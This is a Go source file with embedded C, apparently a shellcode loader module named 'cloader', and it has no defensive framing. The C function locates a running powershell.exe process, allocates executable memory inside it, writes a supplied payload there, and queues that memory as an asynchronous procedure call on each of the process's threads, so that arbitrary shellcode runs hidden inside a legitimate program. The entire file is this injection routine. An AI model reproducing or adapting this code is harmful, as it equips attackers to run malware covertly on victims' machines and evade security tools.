package cloader

/*
#include <windows.h>
#include <tlhelp32.h>

void APC(uintptr_t p, int len) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    HANDLE victimProcess = NULL;
    PROCESSENTRY32 processEntry;
    THREADENTRY32 threadEntry;
    DWORD threadIds[1024]; // 假设最多1024个线程
    DWORD threadCount = 0;
    HANDLE threadHandle;

    // 初始化PROCESSENTRY32结构体
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    threadEntry.dwSize = sizeof(THREADENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, "powershell.exe") == 0) {
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    victimProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(victimProcess, shellAddress, (LPCVOID)p, len, NULL);

    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                if (threadCount < 1024) {
                    threadIds[threadCount++] = threadEntry.th32ThreadID;
                }
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }

    for (DWORD i = 0; i < threadCount; ++i) {
        threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadIds[i]);
        if (threadHandle != NULL) {
            QueueUserAPC((PAPCFUNC)shellAddress, threadHandle, 0);
            CloseHandle(threadHandle);
            Sleep(2000); // 休眠2秒，避免APC调用过快
        }
    }

    CloseHandle(victimProcess);
    CloseHandle(snapshot);
}
*/
import "C"
import "unsafe"

func APCInject(p []byte) {
	C.APC((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
